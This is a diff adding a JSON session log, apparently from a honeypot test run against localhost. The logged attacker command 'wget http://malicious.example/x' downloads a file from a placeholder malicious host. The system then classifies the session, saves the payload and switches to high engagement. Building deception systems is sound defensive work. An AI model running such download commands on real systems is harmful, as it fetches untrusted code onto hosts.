@@ -1,0 +1,44 @@
+{
+  "session_id": "S-1762797098",
+  "src_ip": "127.0.0.1",
+  "src_port": 57713,
+  "events": [
+    {
+      "ts": 1762797098.6284478,
+      "text": "wget http://malicious.example/x"
+    },
+    {
+      "ts": 1762797098.6870563,
+      "text": "[STRUCT_EVENT]={\"type\": \"classification\", \"label\": \"recon\", \"confidence\": 0.6, \"vector\": \"download\", \"src_ip\": \"127.0.0.1\", \"src_port\": 57713, \"engagement\": \"HIGH\", \"summary\": \"RECON (download) \\u2014 conf 0.60, ENG=HIGH\", \"ts\": 1762797098.6870563}"
+    },
+    {
+      "ts": 1762797098.6902885,
+      "text": "[CLASS]=recon|0.6|ENG=HIGH"
+    },
+    {
+      "ts": 1762797098.7316835,
+      "text": "[STRUCT_EVENT]={\"type\": \"payload_saved\", \"file\": \"payload_handoff_1762797098.bin\", \"path\": \"C:\\\\project\\\\data\\\\sessions\\\\S-1762797098\\\\payload_handoff_1762797098.bin\", \"sha256\": \"ed0d381831c7e7c671ebf05d67cfad06d85a2a06922c225e9f256f7a2e950516\", \"size\": 26, \"saved_ts\": 1762797098.7316444, \"src_ip\": \"127.0.0.1\", \"src_port\": 57713, \"summary\": \"Payload saved from suspected download\", \"ts\": 1762797098.7316835}"
+    },
+    {
+      "ts": 1762797098.7588842,
+      "text": "[PAYLOAD_SAVED]={'file': 'payload_handoff_1762797098.bin', 'path': 'C:\\\\project\\\\data\\\\sessions\\\\S-1762797098\\\\payload_handoff_1762797098.bin', 'sha256': 'ed0d381831c7e7c671ebf05d67cfad06d85a2a06922c225e9f256f7a2e950516', 'size': 26, 'saved_ts': 1762797098.7316444}"
+    },
+    {
+      "ts": 1762797098.792041,
+      "text": "[ACTION]=HANDOFF_TO_HIGH_ENGAGEMENT"
+    },
+    {
+      "ts": 1762797098.8202877,
+      "text": "[HIGH_ENGAGEMENT]=START"
+    },
+    {
+      "ts": 1762797100.6290677,
+      "text": "ATTACKER_CMD: ls -la"
+    },
+    {
+      "ts": 1762797101.2918284,
+      "text": "[HIGH_ENGAGEMENT]=END"
+    }
+  ],
+  "end_time": "Mon Nov 10 23:21:41 2025"
+}
